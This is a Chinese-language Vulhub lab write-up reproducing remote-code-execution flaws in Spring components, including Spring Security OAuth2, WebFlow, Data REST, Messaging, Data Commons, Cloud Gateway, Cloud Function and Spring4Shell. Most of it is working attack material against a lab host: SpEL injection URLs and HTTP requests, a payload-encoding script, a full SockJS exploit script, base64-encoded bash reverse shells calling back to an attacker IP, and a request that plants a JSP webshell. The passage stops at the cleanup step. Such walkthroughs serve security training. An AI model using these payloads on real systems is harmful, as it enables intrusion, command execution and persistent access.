---
title: Spring Framework
published: 2026-10-07T09:00:00+08:00
description: 全面解析 Spring 框架的 SpEL 表达式注入与数据绑定漏洞，涵盖 CVE-2022-22965（Spring4Shell）、CVE-2022-22947（Spring Cloud Gateway RCE）、CVE-2022-22963（Spring Cloud Function RCE）、CVE-2017-8046（Spring Data REST RCE）等核心漏洞的原理分析、利用手法及实战修复方案。
image: images/Pasted image 20261006194944.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| 项目          | 详情                                                                                                                                                                                          |
| ----------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.128）                                                                                                                                                              |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                                                                                                                                                      |
| **CVSS 评分** | CVE-2022-22965: 9.8（严重） / CVE-2022-22947: 10.0（严重） / CVE-2022-22963: 9.8（严重）                                                                                                                |
| **典型漏洞编号**  | CVE-2022-22965（Spring4Shell）/ CVE-2022-22947（Spring Cloud Gateway RCE）/ CVE-2022-22963（Spring Cloud Function RCE）/ CVE-2017-8046（Spring Data REST RCE）/ CVE-2018-1270（Spring Messaging RCE） |
| **影响组件**    | Spring Framework 5.3.0 ~ 5.3.17 / Spring Cloud Gateway 3.1.0 ~ 3.1.1 / Spring Cloud Function 3.2.2 等                                                                                        |
| **漏洞类型**    | SpEL 表达式注入 / 数据绑定（Data Binding）→ 远程代码执行（RCE）/ 权限绕过                                                                                                                                          |
| **利用条件**    | 使用漏洞版 Spring 组件 + 用户可控的 SpEL 表达式或数据绑定入口                                                                                                                                                     |
| **核心原理**    | SpEL 表达式未安全过滤，或数据绑定未限制类属性访问，导致恶意代码执行                                                                                                                                                        |
## 一、漏洞原理

Spring 框架的漏洞家族，主要围绕两条核心技术主线展开：**SpEL 表达式注入**和**数据绑定（Data Binding）**。

**SpEL（Spring Expression Language）** 是 Spring 框架提供的一种强大的表达式语言，设计初衷是支持在运行时查询和操作对象图。它语法类似 OGNL，支持方法调用、属性访问、类实例化等。Spring 在多个组件中使用 SpEL 来处理动态表达式，包括 Spring Security OAuth2、Spring Data REST、Spring Messaging、Spring Cloud Gateway、Spring Cloud Function 等。当用户可控的输入被拼接到 SpEL 表达式中并由 StandardEvaluationContext 解析执行时，攻击者就可以构造恶意表达式调用 java.lang.Runtime 执行系统命令，形成远程代码执行（RCE）。

**数据绑定（Data Binding）** 是 Spring MVC 的核心功能之一，它负责将 HTTP 请求参数自动映射到 Java 对象的属性上。在 CVE-2022-22965（Spring4Shell）中，攻击者利用数据绑定机制，通过 class.module.classLoader 访问链，逐级操控 Tomcat 的日志配置属性，最终将 Webshell 写入 Web 根目录。这条攻击链不依赖 SpEL 注入，而是利用 Java Bean 属性绑定的递归访问能力，属于另一条独特的技术路线。

除上述两类核心漏洞外，Spring 生态还出现过认证绕过（CVE-2022-22978）和路径穿越（CVE-2025-41242）等漏洞，前者利用正则表达式 . 的匹配缺陷，后者利用 Spring 与 Jetty 之间 URI 解码的不一致性，都非常具有研究价值。

## 二、漏洞复现

### 1. CVE-2016-4977（Spring Security OAuth2 SpEL 注入）

Spring Security OAuth 在使用 whitelabel views 处理错误时，由于使用了 SpEL 解析错误参数，攻击者在被授权的情况下可以通过构造恶意参数远程执行命令。

**① 验证漏洞是否可利用**

访问以下 URL：
```text wrap
http://192.168.197.88:8080/oauth/authorize?response_type=${233*233}&client_id=acme&scope=openid&redirect_uri=http://test
```

然后在弹出登录框中输入admin:admin，如果页面返回54289（233×233 的结果），说明SpEL表达式已被执行，漏洞存在。
![](images/Pasted%20image%2020261006202452.png)
**② 反弹 Shell**

反弹shell的命令为：
```text wrap
bash -i >& /dev/tcp/192.168.197.128/4444 0>&1
```
base64编码后得到：
```text wrap
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx
```
拼装成 Java 环境下的反弹命令（**下面要用**）：
```text wrap
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
```
使用 `poc.py` 生成反弹 Shell 的 SpEL 表达式：
```python wrap
#!/usr/bin/env python
message = input('Enter message to encode:')
poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
for ch in message[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 
poc += ')}'
print(poc)
```
执行该python代码：
```text wrap
python3 poc.py
```
当出现 `Enter message to encode:` 时，**粘贴上面那一整行反弹命令，然后回车，得到SpEL表达式**：
![](images/Pasted%20image%2020261006203904.png)
然后需要将生成的 SpEL 语句拼接到 `response_type` 参数值中：

```text wrap
http://192.168.197.88:8080/oauth/authorize?response_type=<粘贴生成的SpEL表达式>&client_id=acme&scope=openid&redirect_uri=http://test
```

因此得到完整的 URL 如下：
```text wrap
http://192.168.197.88:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(53)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(68)).concat(T(java.lang.Character).toString(81)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))}&client_id=acme&scope=openid&redirect_uri=http://test
```

同时kali记得开启端口监听：
```text wrap
nc -lvnp 4444
```
在浏览器访问该URL：
![](images/Pasted%20image%2020261006203646.png)
此时查看kali，发现反弹shell成功： 
![](images/Pasted%20image%2020261006203605.png)
### 2. CVE-2017-4971（Spring WebFlow SpEL 注入）

Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的 field，将导致一个 SpEL 表达式注入漏洞，最终造成任意命令执行。

**① 登录系统**

访问 `http://192.168.197.88:8080/login`，使用页面左侧给出的任意账号/密码登录。
![](images/Pasted%20image%2020261007102941.png)
**② 进入预订流程**

直接点击查找酒店：
![](images/Pasted%20image%2020261007103459.png)
选择第一个，点击查看酒店：
![](images/Pasted%20image%2020261007103559.png)
填写信息后点击 "Process"，再点击 "Confirm"（从这一步，其实 WebFlow 就正式开始了）。
![](images/Pasted%20image%2020261007104111.png)
注意下面点击 "Confirm"之前，先要在BurpSuite开启抓包。
![](images/Pasted%20image%2020261007103955.png)
**③ 注入 Payload**

抓取 POST 数据包，向其中添加以下字段：
```text wrap
_(new java.lang.ProcessBuilder("bash","-c","bash -i >& /dev/tcp/192.168.197.128/4444 0>&1")).start()=vulhub
```
注意对 Payload 进行 URL 编码：
```text wrap
_%28new%20java%2Elang%2EProcessBuilder%28%22bash%22%2C%22-c%22%2C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E197%2E128%2F4444%200%3E%261%22%29%29%2Estart%28%29=vulhub
```
![](images/Pasted%20image%2020261007110802.png)

接着在kali开启端口监听：
```text wrap
nc -lvnp 4444
```
回到BurpSuite点击发送数据包，然后查看kali，发现反弹shell成功：
![](images/Pasted%20image%2020261007110725.png)
### 3. CVE-2017-8046（Spring Data REST SpEL 注入）

Spring Data REST 的 PATCH 方法中，JSON Patch 的 `path` 值被传入 `setValue`，导致 SpEL 表达式执行。

**① 验证漏洞**

发送以下 PATCH 请求：
```http wrap
PATCH /customers/1 HTTP/1.1
Host: 192.168.197.88:8080
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]
```
下面解释一下上面的 PATCH 请求是在干什么。

这个字节数组：
```text wrap
{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}
```
每个数字对应一个 ASCII 字符（例如116对应t，111对应o），逐个转成字符就是：
```text wrap
touch /tmp/success
```
也就是说，这个 Payload 最终执行的是：
```java wrap
Runtime.getRuntime().exec(new String("touch /tmp/success"))
```
作用是在靶机容器的 /tmp 目录下创建一个名为 success 的文件，用来验证命令执行是否成功。

那为什么要用字节数组，而不直接写字符串？

直接用字符串的话，SpEL 表达式会变成：
```java wrap
T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")/lastname
```
这样写会带来几个问题：
1. **空格问题**：SpEL 表达式中的空格可能被解析器截断或误判。
2. **引号问题**：JSON 里嵌 JSON，字符串里的双引号需要转义，很容易写错。
3. **特殊字符过滤**：有些版本对 exec("...") 这种直接传字符串的写法有安全过滤，但用 new String(new byte\[]{...}) 可以绕过简单的关键字检测。
4. **兼容性更好**：字节数组完全避免了引号和空格，传给 SpEL 解析器时更“干净”。

![](images/Pasted%20image%2020261007133838.png)
点击发送后，进入容器验证：
```text wrap
docker-compose exec spring bash
ls -l /tmp/success
```

如果文件存在，说明命令执行成功。
![](images/Pasted%20image%2020261007123134.png)
**② 反弹 Shell**

只需要把字节数组替换成反弹 Shell 命令的 ASCII 码即可。例如：
```text wrap
bash -i >& /dev/tcp/192.168.197.128/4444 0>&1
```
但是上面的命令会**直接失败**，**因为 Java Runtime.exec() 的执行方式**——它不通过 Shell 解析命令，所以 >& 和 /dev/tcp 这些 Shell 特殊语法不会被解释，命令直接失败。

**解决方案：** 用 bash -c 包裹 + Base64 编码。也就是让 Java 只调用 bash -c，把真正的命令通过 Base64 传递，避免空格和特殊字符被 Java 切碎（这种情况前面2道题也有出现，但是当时并没有特别说明，后面的话就直接使用这种不会失败的反弹shell了）。

首先将上面的命令进行base64编码：
```text wrap
echo -n 'bash -i >& /dev/tcp/192.168.197.128/4444 0>&1' | base64
```
得到：
```text wrap
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx
```
然后拼装命令：
```text wrap
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
```
接下来要生成字节数组，可以使用python快速生成对应的字节数组：
```python wrap
cmd = 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'

print(','.join(str(ord(c)) for c in cmd))
```
![](images/Pasted%20image%2020261007131431.png)
得到下面的字节数组：
```text wrap
98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,53,78,121,52,120,77,106,103,118,78,68,81,48,78,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125
```
然后把生成的数组填入 Payload：
```http wrap
PATCH /customers/1 HTTP/1.1
Host: 192.168.197.88:8080
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,53,78,121,52,120,77,106,103,118,78,68,81,48,78,67,65,119,80,105,89,120,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125}))/lastname", "value": "vulhub" }]
```
使用BurpSuite发送后即可获得反弹 Shell。
![](images/Pasted%20image%2020261007131521.png)

### 4. CVE-2018-1270（Spring Messaging SpEL 注入）

Spring Messaging 基于 SockJS，底层适配 WebSocket 或 HTTP。在 Vulhub 环境中，可以直接使用 HTTP 复现。Spring Messaging 允许客户端订阅消息并使用 selector 过滤消息，selector 用 SpEL 表达式编写并使用 StandardEvaluationContext 解析，造成命令执行漏洞。

**① 验证漏洞是否可利用（POC脚本）**

目录下提供了 exploit.py（需 Python 3.6 执行），修改其中的 URL 为靶机地址（代码如下）：
```python wrap
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json
logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))

class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)
    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']
        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])
        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")
    def __del__(self):
        self.session.close()

sockjs = SockJS('http://192.168.197.88:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)
sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})
sockjs.send('subscribe', {
    'selector': "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')",
    'id': 'sub-0',
    'destination': '/topic/greetings'
})
data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)
```
把上面的脚本保存到kali桌面。

由于最新版kali默认的python版本为3.13.12，同时apt不能安装python 3.6，因此使用docker来解决python环境问题。

首先使用下面的命令拉取python 3.6的镜像：
```text wrap
docker pull python:3.6
```
然后使用下面的命令将桌面挂载到容器中，同时进入容器的shell，以便使用容器内的环境：
```text wrap
docker run --rm -it \
  --network host \
  -v /root/桌面:/workspace \
  -w /workspace \
  python:3.6 bash
  
#参数说明：
--rm：容器退出后自动删除
-it：交互式终端
--network host：容器直接使用 Kali 的网络栈（关键！否则靶机无法回连）
-v /root/桌面:/workspace：把宿主机目录挂载进容器
-w /workspace：设置工作目录
python:3.6：使用的镜像
bash：进入容器的 shell
```
进入容器后，会看到提示符变成类似 root@kali:/workspace#，表示进入了容器内部，依次执行：
```text wrap
pip install requests
python exploit.py
```

![](images/Pasted%20image%2020261007150624.png)
脚本会自动订阅消息并发送触发请求，使后端执行 SpEL 表达式。
![](images/Pasted%20image%2020261007150304.png)
此时如果进入靶机的docker容器中查看，发现在tmp目录下多了success文件，说明POC脚本成功执行，漏洞可以利用。
```text wrap
docker compose exec spring bash
ls -la /tmp/success
```
![](images/Pasted%20image%2020261007150339.png)

**② 反弹 Shell**

先在 Kali 上生成 Base64：
```text wrap
echo -n 'bash -i >& /dev/tcp/192.168.197.128/4444 0>&1' | base64
```
得到：
```text wrap
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx
```
然后修改 selector：
```text wrap
'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')",
```
完整的payload如下：
```python wrap
#!/usr/bin/env python3
import requests
import random
import string
import time
import threading
import logging
import sys
import json
logging.basicConfig(stream=sys.stdout, level=logging.INFO)

def random_str(length):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for c in range(length))

class SockJS(threading.Thread):
    def __init__(self, url, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base = f'{url}/{random.randint(0, 1000)}/{random_str(8)}'
        self.daemon = True
        self.session = requests.session()
        self.session.headers = {
            'Referer': url,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
        }
        self.t = int(time.time()*1000)
    def run(self):
        url = f'{self.base}/htmlfile?c=_jp.vulhub'
        response = self.session.get(url, stream=True)
        for line in response.iter_lines():
            time.sleep(0.5)
    def send(self, command, headers, body=''):
        data = [command.upper(), '\n']
        data.append('\n'.join([f'{k}:{v}' for k, v in headers.items()]))
        data.append('\n\n')
        data.append(body)
        data.append('\x00')
        data = json.dumps([''.join(data)])
        response = self.session.post(f'{self.base}/xhr_send?t={self.t}', data=data)
        if response.status_code != 204:
            logging.info(f"send '{command}' data error.")
        else:
            logging.info(f"send '{command}' data success.")
    def __del__(self):
        self.session.close()

sockjs = SockJS('http://192.168.197.88:8080/gs-guide-websocket')
sockjs.start()
time.sleep(1)
sockjs.send('connect', {
    'accept-version': '1.1,1.0',
    'heart-beat': '10000,10000'
})

# ============ 修改点：改成反弹 Shell 的 SpEL ============
sockjs.send('subscribe', {
    'selector': "T(java.lang.Runtime).getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')",
    'id': 'sub-0',
    'destination': '/topic/greetings'
})
data = json.dumps({'name': 'vulhub'})
sockjs.send('send', {
    'content-length': len(data),
    'destination': '/app/hello'
}, data)
```
同样需要在kali上面开启端口监听，然后在docker容器中执行该脚本后，可以发现反弹shell成功：
![](images/Pasted%20image%2020261007153528.png)

### 5. CVE-2018-1273（Spring Data Commons SpEL 注入）

Spring Data 是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons 是 Spring Data 下所有子项目共享的基础框架。Spring Data Commons 在 2.0.5 及以前版本中，存在一处 SpEL 表达式注入漏洞，攻击者可以注入恶意 SpEL 表达式以执行任意命令。

**① 抓取注册请求**

访问 `http://192.168.197.88:8080/users`，在用户注册页面抓取 POST 请求。

![](images/Pasted%20image%2020261008201350.png)

**② 注入 Payload**

将请求体修改为：
```http wrap
POST /users?page=&size=5 HTTP/1.1
Host: 192.168.197.88:8080
Content-Length: 46
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.197.88:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.197.88:8080/users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
```
这里可以发现POC其实就是把：
- **原来的普通参数名** `username` 替换成了 **`username[恶意 SpEL 表达式]`**
- **原来的参数值** `111` 删掉或留空（这里直接写 `=` 后面无值）
- 后面的 `password` 和 `repeatedPassword` 保持原样（留空也可以）

为什么这样能触发漏洞？

Spring Data Commons在把请求参数绑定到实体对象时，会解析参数名中的属性路径。当参数名写成username[...]这种形式时，方括号内的内容会被当作SpEL表达式来求值。

所以攻击者只要在方括号里塞入恶意SpEL表达式，Spring Data在绑定过程中就会执行这段代码，从而实现任意命令执行。
![](images/Pasted%20image%2020261008200444.png)
发送请求后进入容器验证：
```text wrap
docker compose exec spring bash
ls -l /tmp/success
```
![](images/Pasted%20image%2020261008200544.png)
将上面的touch /tmp/success替换为反弹Shell命令即可获取 Shell。

首先在Kali上生成反弹shell的Base64的编码：
```text wrap
echo -n 'bash -i >& /dev/tcp/192.168.197.128/4444 0>&1' | base64
```
得到：
```text wrap
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx
```
则原始Payload为（将上面exec函数括号里面的touch /tmp/success内容替换为下面的内容）：
```text wrap
username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}')]=&password=&repeatedPassword=
```
对原始Payload进行URL编码：
```text wrap
username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%27bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%27%29%5D=&password=&repeatedPassword=
```
**说明：为什么这里需要对payload进行url编码，而上面的POC却不需要？**

关键区别在于：**第二个 Payload 里包含了 `+` 号，而 `+` 在 `application/x-www-form-urlencoded` 中会被服务器自动解码成空格**，导致 Base64 字符串被破坏，反弹 Shell 命令失效。第一个 Payload（`touch /tmp/success`）里没有 `+`、`&`、`%` 这些会干扰表单解析的字符，所以即使不编码，服务器也能“容忍”并正确解析。

**✅ 最佳实践：无论 Payload 看起来多简单，都建议对参数名和参数值进行完整的 URL 编码**，这样可以避免因特殊字符导致的解析错误。

得到最终 POST 请求体：
```http wrap
POST /users?page=&size=5 HTTP/1.1
Host: 192.168.197.88:8080
Content-Length: 265
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.197.88:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.197.88:8080/users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%27bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE5Ny4xMjgvNDQ0NCAwPiYx%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%27%29%5D=&password=&repeatedPassword=
```
![](images/Pasted%20image%2020261008202311.png)

![](images/Pasted%20image%2020261008202228.png)
### 6. CVE-2022-22947（Spring Cloud Gateway SpEL 注入）

Spring Cloud Gateway 是 Spring 中的一个 API 网关。其 3.1.0 及 3.0.6 版本（包含）以前存在一处 SpEL 表达式注入漏洞，当攻击者可以访问 Actuator API 的情况下，将可以利用该漏洞执行任意命令。

**① 添加恶意路由**

```http wrap
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: 192.168.197.88:8080
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```
![](images/Pasted%20image%2020261010162854.png)
**② 触发表达式执行**

```http wrap
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.197.88:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
![](images/Pasted%20image%2020261010163229.png)
**③ 查看执行结果**

```http wrap
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: 192.168.197.88:8080
```

响应中会包含 `id` 命令的执行结果。
![](images/Pasted%20image%2020261010163324.png)
**④ 清理现场（删除路由）**

```http wrap
DELETE /actuator/gateway/routes/hacktest HTTP/1.1
Host: 192.168.197.88:8080
```

再次发送 `POST /actuator/gateway/refresh` 刷新路由即可。
![](images/Pasted%20image%2020261010163403.png)

后续再将添加恶意路由中的命令改为反弹shell即可，这里不再演示。
### 7. CVE-2022-22963（Spring Cloud Function SpEL 注入）

Spring Cloud Function 3.2.2 中，`spring.cloud.function.routing-expression` 请求头中包含的 SpEL 表达式会被执行。

**① 发送恶意请求**

```http wrap
POST /functionRouter HTTP/1.1
Host: 192.168.197.88:8080
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4

test
```
![](images/Pasted%20image%2020261010194037.png)
**② 验证结果**

```text wrap
docker compose exec spring bash
ls -l /tmp/success
```
![](images/Pasted%20image%2020261010194112.png)
将 `touch /tmp/success` 替换为反弹 Shell 命令即可获取 Shell，这里不再演示。

### 8. CVE-2022-22965（Spring4Shell 数据绑定 RCE）

在 JDK 9+ 上运行的 Spring MVC 应用，若以 WAR 包形式部署在 Tomcat 中，攻击者可通过数据绑定修改 Tomcat 日志配置，写入 JSP Webshell。

服务启动后，访问 `http://192.168.197.88:8080/?name=Bob&age=25` 即可看到一个演示页面。
![](images/Pasted%20image%2020261010215805.png)

**① 修改 Tomcat 日志配置**

发送以下 GET 请求：
```http wrap
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: 192.168.197.88:8080
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
```
![](images/Pasted%20image%2020261010221059.png)
**② 访问 Webshell**

```text wrap
http://192.168.197.88:8080/tomcatwar.jsp?pwd=j&cmd=id
```
![](images/Pasted%20image%2020261010221121.png)
**③ 清理配置**

